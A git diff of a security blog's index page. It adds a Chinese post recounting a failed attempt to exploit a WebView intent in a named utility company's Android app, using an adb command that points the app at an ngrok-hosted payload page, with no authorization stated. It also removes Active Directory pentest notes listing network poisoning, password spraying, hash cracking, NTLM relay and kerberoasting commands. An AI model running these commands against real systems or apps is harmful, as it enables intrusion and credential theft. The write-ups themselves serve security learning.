@@ -124,6 +124,133 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-webview" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/03/31/webview/" class="article-date">
+  	<time datetime="2024-03-31T08:11:44.975Z" itemprop="datePublished">2024-03-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/03/31/webview/">
+        Webview Attacks
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="failed-attack-process"><a href="#failed-attack-process" class="headerlink" title="failed attack process"></a>failed attack process</h3><p>來說說webview的採坑過程，原本以為有洞，結果後來發現..</p>
+<p>目標是某個公司的apk，通過jadx-gui把apk的所有程式挖出來</p>
+<p>Android WebView 是 Android 作業系統 (OS) 的系統元件，可讓 Android 應用程式直接在應用程式內顯示來自 Web 的內容。 </p>
+<p>WebView 應用程式主要由 Javascript、CSS 和 HTML 檔案組成。基本上，該應用程式是一個或多個網頁。這些網頁構成了您的前端介面。</p>
+<p>如果開發人員想要為應用程式新增瀏覽器功能，他&#x2F;她可以包含 WebView 庫並建立 WebView 類別的實例；這本質上是在應用程式中嵌入了一個瀏覽器來執行渲染網頁和執行 JavaScript 等操作。</p>
+<p>首先，通過弱掃發現了Remote WebView debugging是開啟的狀態</p>
+<p>Remote WebView debugging is enabled. 	</p>
+<p>high 	CWE: CWE-919: Weaknesses in Mobile Applications<br>OWASP Top 10: M1: Improper Platform Usage<br>OWASP MASVS: MSTG-RESILIENCE-2 	</p>
+<p>tw&#x2F;net&#x2F;sun&#x2F;fudon&#x2F;water&#x2F;MainActivity.java</p>
+<p>先找到及確認該功能為啟用</p>
+<p>確認了webview 功能啟用且引用了該功能</p>
+<p><img src="/img/webview.png" alt="Untitled"></p>
+<p>Webview Inten 方案，如果管理不慎可能導致利用漏洞，可能導致XSS攻擊</p>
+<p>查看有權限的componer路徑，有權限訪問才能查看到路徑</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**adb shell dumpsys package | grep tw.net.sun.fudon**</span><br><span class="line">        1283ffd tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</span><br><span class="line">        1283ffd tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</span><br></pre></td></tr></table></figure>
+
+<p>setJavaScriptEnabled(true);</p>
+<ul>
+<li>這將允許 webview 在 webview 中運行 javascript。通常用於提供網站的完整功能，但可以被利用</li>
+<li>未經適當保護啟用JavaScript可能會引入安全漏洞</li>
+</ul>
+<p><img src="/img/webview1.png" alt="Untitled"></p>
+<ul>
+<li><strong>enableRemoteDebugging() 啟用 WebView 的遠端偵錯功能</strong><ul>
+<li>在生產環境中啟用了遠端偵錯功能，可能會為攻擊者提供額外的攻擊面</li>
+<li>攻擊者可以利用遠端偵錯功能來竊取敏感資訊、執行惡意程式碼等</li>
+<li>建議在生產環境中停用遠端調試功能</li>
+<li>可以透過在啟動應用程式時檢查建置類型或設定檔中的標誌來控制是否啟用遠端偵錯功能</li>
+</ul>
+</li>
+<li><strong>exposeJsInterface()</strong><ul>
+<li>WebView 中暴露一個 JavaScript 接口，使得 JavaScript 程式碼可以呼叫該接口中的方法</li>
+<li>這種操作可能存在安全風險，特別是如果不正確地處理暴露的接口，可能導致遠端程式碼執行漏洞或其他安全問題</li>
+<li>建議仔細審查和驗證暴露的接口，確保只有受信任的程式碼可以調用，並且避免直接將敏感資料暴露給 JavaScript</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/webview2.png" alt="Untitled"></p>
+<p>Remote WebView debugging is enabled</p>
+<ul>
+<li>開啟遠端 WebView 偵錯可能會使應用程式容易受到攻擊，尤其是在生產環境中</li>
+<li>攻擊者可以利用遠端 WebView 偵錯來查看應用程式的原始程式碼、注入惡意腳本、竊取敏感資訊等</li>
+<li>確保在生產版本中停用 WebView 的遠端偵錯功能，可以在應用程式的啟動或配置過程中進行設定</li>
+</ul>
+<p>intent.getStringExtra(“url”) </p>
+<ul>
+<li>這會將 extra 的值（此處為 url）儲存到新的字串 url 中</li>
+<li>這邊會關乎到能否去利用webview啟用狀態而進行exploit</li>
+</ul>
+<p><img src="/img/webview3.png" alt="Untitled"></p>
+<p><img src="/img/webview4.png" alt="Untitled"></p>
+<p>但是，看到這邊AndroidManifest.xml裡面的紀錄，</p>
+<p>android:exported&#x3D;”False” 不能注入了QQ</p>
+<p>如果是true，就能進行攻擊了，也就是前面的分析白費，這邊沒啟用就是利用不了</p>
+<p><img src="/img/webview5.png" alt="Untitled"></p>
+<p>可以稍微說下，當初在看程式的時候，看到在這邊是啟用的狀態，覺得很興奮，以為有料能進行利用了</p>
+<p><img src="/img/webview6.png" alt="Untitled"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme.NoActionBarLaunch&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_main&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;tw.net.sun.fudon.water.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTask&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;portrait&quot;</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;smallestScreenSize|screenSize|uiMode|screenLayout|orientation|keyboardHidden|keyboard|locale&quot;</span> <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;adjustPan&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以就去測試了一下，指令如下</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove --purge apache2 apache2-utils</span><br><span class="line">sudo apt-get install --reinstall apache2 apache2-utils</span><br><span class="line">sudo service apache2 start</span><br><span class="line">sudo service apache2 status</span><br><span class="line"></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# ngrok http <span class="number">80</span></span><br><span class="line"><span class="title class_">Usage</span> <span class="keyword">of</span> ngrok requires a verified account and authtoken.</span><br><span class="line"></span><br><span class="line"><span class="title class_">Sign</span> up <span class="keyword">for</span> an <span class="attr">account</span>: <span class="attr">https</span>:<span class="comment">//dashboard.ngrok.com/signup  到官網註冊後會產生以下指令，輸入即可</span></span><br><span class="line"><span class="title class_">Install</span> your <span class="attr">authtoken</span>: <span class="attr">https</span>:<span class="comment">//dashboard.ngrok.com/get-started/your-authtoken</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">ERR_NGROK_4018</span></span><br><span class="line"></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# **ngrok config add-authtoken 2eJvh3PifjXXXXXXXXXXXXXXXXCgLXVK74**</span><br><span class="line"><span class="title class_">Authtoken</span> saved to configuration <span class="attr">file</span>: <span class="regexp">/root/</span>.<span class="property">config</span>/ngrok/ngrok.<span class="property">yml</span></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# ngrok http <span class="number">80</span></span><br><span class="line"></span><br><span class="line">and use **https ngrok link</span><br><span class="line">記得payload.<span class="property">html</span>要放在ngrok啟用的目錄下**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/webview7.png" alt="Untitled"></p>
+<blockquote>
+<p>adb shell am start -n componentname –es string “<a target="_blank" rel="noopener" href="http://domain.com/">domain.com</a>“</p>
+</blockquote>
+<p>componentname 是前面通過 <strong>adb shell dumpsys package</strong> 然後列出的package路徑，如果你的android:exported&#x3D;”True”，就能看到路徑列出，甚至進行利用</p>
+<p>前面列出的路徑是<code>tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</code></p>
+<p><code>--es</code> 後面接的是intent.getStringExtra裡面塞的東西</p>
+<p>所以指令這樣下</p>
+<p><code>adb shell am start -n tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity --es url &quot; [https://c5b7-210-242-228-139.ngrok-free.app](https://c579-59-120-78-233.ngrok-free.app/)/payload.html&quot;</code></p>
+<p><img src="/img/webview8.png" alt="Untitled"></p>
+<p>但沒有反應，雖然啟動了APP，但重點是因為 <code>tw.net.sun.fudon.water.MainActivity</code> 這邊 <code>android:exported=”False”</code>，所以exploit就失敗了&#x3D;.&#x3D;</p>
+<p>總結來說，有點可惜，因為他很多設置都是啟用狀態，但真的要好好注意 <code>android:exported</code> 是不是 <code>true</code> ，不然會浪費太多時間在測試它，再加上現在Android的版本太高了，導致很多漏洞利用變得困難</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="post-SCIST_final" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -3258,332 +3385,6 @@ z=2
         <h1 id="Active-Directory-Methodology"><a href="#Active-Directory-Methodology" class="headerlink" title="Active Directory Methodology"></a>Active Directory Methodology</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">└── Active Directory (AD)</span><br><span class="line">    ├── Overview</span><br><span class="line">    │   ├── Foundational Technology</span><br><span class="line">    │   │   ├── Efficient Creation and Management of Domains, Users, and Objects</span><br><span class="line">    │   │   ├── Scalability</span><br><span class="line">    │   │   └── Access Control</span><br><span class="line">    │   ├── Structure</span><br><span class="line">    │   │   ├── Domains</span><br><span class="line">    │   │   │   ├── Collection of Objects (Users, Devices) with a Common Database</span><br><span class="line">    │   │   │   └── Multiple Domains Can Coexist Within a Forest</span><br><span class="line">    │   │   ├── Trees</span><br><span class="line">    │   │   │   ├── Groups of Domains Linked by a Shared Structure</span><br><span class="line">    │   │   │   └── Common Root Domain</span><br><span class="line">    │   │   └── Forests</span><br><span class="line">    │   │       ├── Collection of Multiple Trees</span><br><span class="line">    │   │       └── Interconnected Through Trust Relationships</span><br><span class="line">    │   ├── Key Concepts</span><br><span class="line">    │   │   ├── Directory</span><br><span class="line">    │   │   │   └── Houses Information Pertaining to AD Objects</span><br><span class="line">    │   │   ├── Object</span><br><span class="line">    │   │   │   └── Entities Within the Directory (Users, Groups, Shared Folders)</span><br><span class="line">    │   │   ├── Domain</span><br><span class="line">    │   │   │   └── Container <span class="keyword">for</span> Directory Objects</span><br><span class="line">    │   │   ├── Tree</span><br><span class="line">    │   │   │   └── Grouping of Domains Sharing a Common Root</span><br><span class="line">    │   │   └── Forest</span><br><span class="line">    │   │       └── Collection of Trees with Trust Relationships</span><br><span class="line">    └── Active Directory Domain Services (AD DS)</span><br><span class="line">        ├── Services</span><br><span class="line">        │   ├── Domain Services</span><br><span class="line">        │   │   └── Centralizes Data Storage and Manages Interactions Between Users and Domains</span><br><span class="line">        │   ├── Certificate Services</span><br><span class="line">        │   │   └── Creation, Distribution, and Management of Secure Digital Certificates</span><br><span class="line">        │   ├── Lightweight Directory Services</span><br><span class="line">        │   │   └── Supports Directory-enabled Applications Through LDAP</span><br><span class="line">        │   ├── Directory Federation Services</span><br><span class="line">        │   │   └── Provides Single-Sign-On Across Multiple Web Applications</span><br><span class="line">        │   ├── Rights Management</span><br><span class="line">        │   │   └── Safeguards Copyright Material</span><br><span class="line">        │   └── DNS Service</span><br><span class="line">        │       └── Crucial <span class="keyword">for</span> Domain Name Resolution</span><br><span class="line">        └── Kerberos Authentication</span><br><span class="line">            └── Understanding the Kerberos Authentication Process</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">└── Recon Active Directory (No creds/sessions)</span><br><span class="line">    ├── Pentest the Network</span><br><span class="line">    │   ├── Scan <span class="keyword">for</span> Machines and Open Ports</span><br><span class="line">    │   │   ├── nmap -p- -sV -T4 &lt;network&gt;</span><br><span class="line">    │   │   └── nmap -p 1-65535 -T4 -A -v &lt;target&gt;</span><br><span class="line">    │   ├── Exploit Vulnerabilities</span><br><span class="line">    │   │   ├── Searchsploit &lt;service/version&gt;</span><br><span class="line">    │   │   ├── Metasploit Framework</span><br><span class="line">    │   │   └── Manual Exploitation</span><br><span class="line">    │   └── Enumerate DNS</span><br><span class="line">    │       └── gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt</span><br><span class="line">    ├── Enumerate SMB</span><br><span class="line">    │   ├── Null and Guest Access</span><br><span class="line">    │   │   ├── enum4linux -a -u <span class="string">&quot;&quot;</span> -p <span class="string">&quot;&quot;</span> &lt;DC IP&gt;</span><br><span class="line">    │   │   └── smbmap -u <span class="string">&quot;&quot;</span> -p <span class="string">&quot;&quot;</span> -P 445 -H &lt;DC IP&gt;</span><br><span class="line">    │   └── Detailed SMB Enumeration</span><br><span class="line">    │       ├── smbclient -U <span class="string">&#x27;%&#x27;</span> -L //&lt;DC IP&gt;</span><br><span class="line">    │       ├── smbclient -U <span class="string">&#x27;guest%&#x27;</span> -L //&lt;DC IP&gt;</span><br><span class="line">    │       └── smbclient -U <span class="string">&#x27;guest%&#x27;</span> //&lt;DC IP&gt;/sharename</span><br><span class="line">    ├── Enumerate LDAP</span><br><span class="line">    │   └── nmap -n -sV --script <span class="string">&quot;ldap* and not brute&quot;</span> -p 389 &lt;DC IP&gt;</span><br><span class="line">    ├── Poison the Network</span><br><span class="line">    │   ├── Gather Credentials with Responder</span><br><span class="line">    │   │   ├── Responder -I &lt;interface&gt;</span><br><span class="line">    │   │   └── Responder -I &lt;interface&gt; -wrf</span><br><span class="line">    │   ├── Relay Attack</span><br><span class="line">    │   │   └── Responder -I &lt;interface&gt; -wb</span><br><span class="line">    │   └── Expose Fake UPnP Services with evil-SSDP</span><br><span class="line">    │       └── python evil-SSDP.py -i &lt;interface&gt; -p &lt;port&gt;</span><br><span class="line">    ├── OSINT</span><br><span class="line">    │   └── Extract Usernames/Names from Internal Documents and Social Media</span><br><span class="line">    │       ├── w0Tx/generate-ad-username</span><br><span class="line">    │       └── urbanadventurer/username-anarchy</span><br><span class="line">    ├── User Enumeration</span><br><span class="line">    │   ├── Anonymous SMB/LDAP Enumeration</span><br><span class="line">    │   │   ├── enum4linux -a -u <span class="string">&quot;&quot;</span> -p <span class="string">&quot;&quot;</span> &lt;DC IP&gt;</span><br><span class="line">    │   │   └── ldapsearch -h &lt;DC IP&gt; -x -b <span class="string">&quot;&quot;</span> -s base <span class="string">&quot;(objectclass=*)&quot;</span> namingContexts</span><br><span class="line">    │   ├── Kerbrute Enumeration</span><br><span class="line">    │   │   └── ./kerbrute_linux_amd64 userenum -d domain.com --dc &lt;DC IP&gt; usernames.txt</span><br><span class="line">    │   ├── OWA Server Enumeration</span><br><span class="line">    │   │   └── MailSniper</span><br><span class="line">    │   │       ├── Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt</span><br><span class="line">    │   │       └── Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021</span><br><span class="line">    │   └── Password Spraying</span><br><span class="line">    │       └── Invoke-PasswordSpray -UserList users.txt -Password Summer2021</span><br><span class="line">    ├── Knowing Usernames</span><br><span class="line">    │   ├── ASREPRoast</span><br><span class="line">    │   │   ├── Get-ASReproastHash -Verbose -OutputFormat hashcat</span><br><span class="line">    │   │   └── hashcat -m 18200 hash.txt rockyou.txt</span><br><span class="line">    │   └── Password Spraying</span><br><span class="line">    │       └── Invoke-PasswordSpray -UserList users.txt -Password Summer2021</span><br><span class="line">    └── LLMNR/NBT-NS Poisoning</span><br><span class="line">        └── NTLM Relay</span><br><span class="line">            ├── ntlmrelayx.py -t &lt;target&gt; -c &lt;payload&gt; -smb2support</span><br><span class="line">            └── ntlmrelayx.py -tf targets.txt -c &lt;payload&gt; -smb2support</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-ActiveDirectory" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/03/05/ActiveDirectory/" class="article-date">
-  	<time datetime="2024-03-04T16:53:46.072Z" itemprop="datePublished">2024-03-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/03/05/ActiveDirectory/">
-        Active Directory Technology
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h1><p>在內網滲透中，當攻擊者取得內網某台機器的控制權後，會以被攻陷的主機為跳板，透過收集域內憑證等各種方法，存取域內其他機器，進一步擴大資產範圍。透過此類手段，攻擊者最終可能獲得網域控制器的存取權限，甚至完全控制基於Windows作業系統的整個內部網路環境，控制網域環境下的全部機器。</p>
-<p>目錄服務 (例如 Active Directory Domain Services (AD DS)) 提供儲存目錄資料的方法，並使這些資料可供網路使用者與系統管理員使用。 例如，AD DS 會儲存使用者帳戶的相關資訊，例如名稱、密碼、電話號碼等，並讓相同網路上的其他授權使用者存取這項資訊。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/nirajkharel/AD-Pentesting-Notes">https://github.com/nirajkharel/AD-Pentesting-Notes</a></p>
-<ul>
-<li><p>Directory service developed by Microsoft to manage Windows domain networks</p>
-</li>
-<li><p>Stores information related to objects,such as Computers,Users,Printers,etc.</p>
-<ul>
-<li>Think about it as a phone book for Windows</li>
-</ul>
-</li>
-<li><p>Authenticates using Kerberos tickets.</p>
-<ul>
-<li>Non-Windows devices,such as Linux machines,firewalls,etc.can also authenticate to Active Directory via RADIUS or LDAP</li>
-</ul>
-</li>
-<li><p>All the directory is a identity management service</p>
-</li>
-<li><p>only for windows machines</p>
-</li>
-<li><p>Active Directory is the most commonly used identity management service in the world</p>
-<ul>
-<li>95%of Fortune 1000 companies implement the service in their networks (<a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/Enterprise-">https://techcommunity.microsoft.com/t5/Enterprise-</a>Mobility-Security&#x2F;Success-with-Enterprise-Mobility-ldentity&#x2F;ba-p&#x2F;248613)</li>
-</ul>
-</li>
-<li><p>Can be exploited without ever attacking patchable exploits.  Instead,we abuse features,trusts,components,and more.</p>
-</li>
-</ul>
-<h2 id="Active-Directory-Components"><a href="#Active-Directory-Components" class="headerlink" title="Active Directory Components"></a>Active Directory Components</h2><ul>
-<li><p>physical components</p>
-<ul>
-<li>Data store</li>
-<li>Domain controllers<ul>
-<li>A domain controller is a server with the AD DS server role installed that has specifically been promoted to a domain controller<ul>
-<li>Host a copy of the AD DS directory store</li>
-<li>Provide authentication and authorization services</li>
-<li>Replicate updates to other domain controllers in the domain and forest</li>
-<li>Allow administrative access to manage user accounts and network resources</li>
-<li>control everything</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Global catalog server</li>
-<li>Read-Only Domain Controller (RODC)</li>
-<li>AD DS Data Store<ul>
-<li>The AD DS data store contains the <strong>database files</strong> and processes that store and <strong>manage directory information</strong> for users, services, and applications</li>
-<li>Consists of the Ntds.dit file<ul>
-<li>在入侵網域控制站後，我們想要取得這個 ntds.dit 檔。它包含儲存在活動目錄中的所有內容。所有<strong>哈希值都儲存在該檔案中</strong>。</li>
-</ul>
-</li>
-<li>Allowed to pull stored password hashes</li>
-<li>Is stored by default in the <strong>%SystemRoot%\NTDS</strong> folder on all domain controllers</li>
-<li>Is accessible only through the domain controller processes and protocols</li>
-<li>可以在目錄中建立哪些對象，例如機器使用者和電腦。可以附加到物件的資訊。顯示名稱等。定義可以儲存在目錄中的每種項目類型。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>logical components</p>
-<ul>
-<li><p>Partitions</p>
-</li>
-<li><p>Schema</p>
-</li>
-<li><p>Domains</p>
-</li>
-<li><p>域用於對組織中的物件進行分組和管理。物件可以是印表機、群組等。</p>
-<ul>
-<li>Domains are <strong>used to group and manage objects</strong> in an organization<ul>
-<li>user、computer、printer…</li>
-</ul>
-</li>
-<li>An administrative boundary for applying policies to groups of objects</li>
-<li>A replication boundary for replicating data between domain controllers</li>
-<li>An authentication and authorization boundary that provides a way to limit the scope of access to resources</li>
-<li>XX.com, XXX.tw, <a target="_blank" rel="noopener" href="http://xxx.org/">XXX.org</a> …</li>
-</ul>
-</li>
-<li><p>Domain trees</p>
-<ul>
-<li>A domain tree is a hierarchy of domains in AD DS<ul>
-<li>parent domain - children domain -  children domain</li>
-<li><a target="_blank" rel="noopener" href="http://contonso.com/">contonso.com</a> - <a target="_blank" rel="noopener" href="http://emea.contoso.com/">emea.contoso.com</a> - na.contoso.com</li>
-<li>Share a contiquous namespace with the parent domain</li>
-<li>Can have additional child domains</li>
-<li>By default create a two-way transitive trust with other domains</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Forests</p>
-<ul>
-<li>A forest is a collection of</li>
-<li>bunch of trees &gt; forest</li>
-<li>one or more domain trees</li>
-<li>Share a common schema</li>
-<li>Share a common configuration partition</li>
-<li>Share a common global catalog to enable searching</li>
-<li>Enable trusts between all domains in the forest</li>
-<li>Share the Enterprise Admins and Schema Admins groups</li>
-<li>compromise a domain admin in a forest</li>
-<li>elevate to an enterprise admin - be able to cross forest with that account</li>
-</ul>
-</li>
-<li><p>Sites</p>
-</li>
-<li><p>Organization units (OUs)</p>
-<ul>
-<li>OUs are <strong>Active Directory containers</strong> that can contain users,groups,computers,and<br>  other OUs</li>
-<li>Represent your organization hierarchically and logically</li>
-<li>Manage a collection of objects in a consistent way</li>
-<li>Delegate permissions to administer groups of objects</li>
-<li>Apply policies</li>
-</ul>
-</li>
-<li><p>Trusts</p>
-<ul>
-<li><p>Trusts provide a mechanism for users to gain access to resources in another domain</p>
-<p>  <img src="/img/AD_Untitled.png" alt="Untitled"></p>
-</li>
-<li><p>All domains in a forest trust all other domains in the forest</p>
-</li>
-<li><p>Trusts can extend outside the forest</p>
-</li>
-</ul>
-</li>
-<li><p>Defines every type of object that can be stored in the directory</p>
-</li>
-<li><p>Enforces rules regarding object creation and configuration</p>
-</li>
-<li><p>Like rule book 、 buleprint</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>Object Types</th>
-<th>Function</th>
-<th>Examples</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Class Object</td>
-<td>What objects can be created in the directory</td>
-<td></td>
-</tr>
-</tbody></table>
-<ul>
-<li>user、computer、printer… | + User</li>
-<li>Computer |<br>  | Attribute Object | Information that can be attached to an object | + Display name |</li>
-</ul>
-</li>
-<li><p>Objects</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>Object</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>User</td>
-<td>Enables network resource access for a user</td>
-</tr>
-<tr>
-<td>InetOrgPerson</td>
-<td>Similar to a user account</td>
-</tr>
-<tr>
-<td>Contacts</td>
-<td>Used primarily to assign e-mail addresses to external users</td>
-</tr>
-<tr>
-<td>Groups</td>
-<td>Used to simplify the administration of access control</td>
-</tr>
-<tr>
-<td>Computers</td>
-<td>Enables authentication and auditing of computer access to resources</td>
-</tr>
-<tr>
-<td>Printers</td>
-<td>Used to simplify the process of locating and connecting to printers</td>
-</tr>
-<tr>
-<td>Shared folders</td>
-<td>Enables users to search for shared folders based on properties</td>
-</tr>
-</tbody></table>
-<p><img src="/img/AD_Untitled_1.png" alt="Untitled"></p>
-<table>
-<thead>
-<tr>
-<th>Command</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>sudo responder -I ens224 -A</td>
-<td>Start Responder in analysis mode</td>
-</tr>
-<tr>
-<td>sudo responder -I ens224 -w -d</td>
-<td>Start network traffic response spoofing with Responder to gather NTLMv2 password hashes</td>
-</tr>
-<tr>
-<td>kerbrute userenum -d INLANEFREIGHT.LOCAL –dc 172.16.5.5 jsmith.txt -o kerb-results</td>
-<td>Enumerate valid Active Directory users for password spraying</td>
-</tr>
-<tr>
-<td>hashcat -m 5600 bsmith_ntlmv2 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</td>
-<td>Attempt to crack an NTLMv2 password hash gathered with Responder using Hashcat</td>
-</tr>
-<tr>
-<td>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 –pass-pol</td>
-<td>Enumerate the domain password policy using CrackMapExec</td>
-</tr>
-<tr>
-<td>crackmapexec smb 10.129.203.121 -u ‘’ -p ‘’ –users –export $(pwd)&#x2F;users.txt</td>
-<td>Check for SMB NULL sessions on a domain controller host and enumerate valid users</td>
-</tr>
-<tr>
-<td>enum4linux -P 172.16.5.5</td>
-<td>Leverage an SMB NULL session on a domain controller host to verify the domain password policy</td>
-</tr>
-<tr>
-<td>kerbrute passwordspray -d inlanefreight.local –dc 172.16.5.5 valid_users.txt Welcome1</td>
-<td>Perform a password spraying attack using the Kerbrute tool</td>
-</tr>
-<tr>
-<td>Import-Module ActiveDirectory</td>
-<td>Load the built-in Active Directory PowerShell module on a Windows host</td>
-</tr>
-<tr>
-<td>Get-ADUser -Filter *</td>
-<td>select Name</td>
-</tr>
-<tr>
-<td>Get-DomainUser *</td>
-<td>Select-Object samaccountname,description</td>
-</tr>
-<tr>
-<td>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL&#x2F;mholliday</td>
-<td>Kerberoast from a Linux attack host</td>
-</tr>
-<tr>
-<td>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u bsmith -p Welcome1</td>
-<td>Run the BloodHound Python version from a Linux attack host to map out the domain</td>
-</tr>
-<tr>
-<td>SharpHound.exe -c all –zipfilename inlanefreight_bloodhound</td>
-<td>Run the SharpHound C# ingestor from a Windows attack host to map out the domain</td>
-</tr>
-<tr>
-<td>Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight_bloodhound</td>
-<td>Run the SharpHound PowerShell ingestor from a Windows attack host to map out the domain</td>
-</tr>
-<tr>
-<td>Rubeus.exe kerberoast &#x2F;ldapfilter:’admincount&#x3D;1’ &#x2F;nowrap</td>
-<td>Kerberoast admin accounts using the Rubeus tool from a Windows attack host</td>
-</tr>
-<tr>
